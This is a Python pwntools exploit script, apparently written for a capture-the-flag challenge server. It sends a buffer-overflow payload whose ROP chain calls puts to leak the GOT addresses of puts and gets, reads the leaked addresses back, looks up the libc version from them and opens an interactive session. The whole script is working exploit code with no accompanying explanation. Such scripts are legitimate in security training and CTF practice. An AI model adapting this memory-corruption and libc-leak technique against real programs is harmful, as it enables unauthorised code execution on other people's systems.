import TheNight
from pwn import *


target = remote("chal.utc-ctf.club", 4902)
#target = process("./server")
elf = ELF('server')

#gdb.attach(target, gdbscript = 'b *0x804863f')

payload = ""
payload += "0"*0x3c
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["puts"])
payload += p32(elf.got["puts"])
payload += p32(elf.got["gets"])

target.sendline(payload)


for i in range(0, 2):
    print target.recvuntil("Return address:")


for i in range(0, 2):
    print target.recvline()


leak0 = target.recvline()[0:4]
leak1 = target.recvline()[0:4]

puts = u32(leak0)
gets = u32(leak1)

print "puts address: " + hex(puts)
print "gets address: " + hex(gets)

TheNight.findLibcVersion("puts", puts, "gets", gets)

target.interactive()
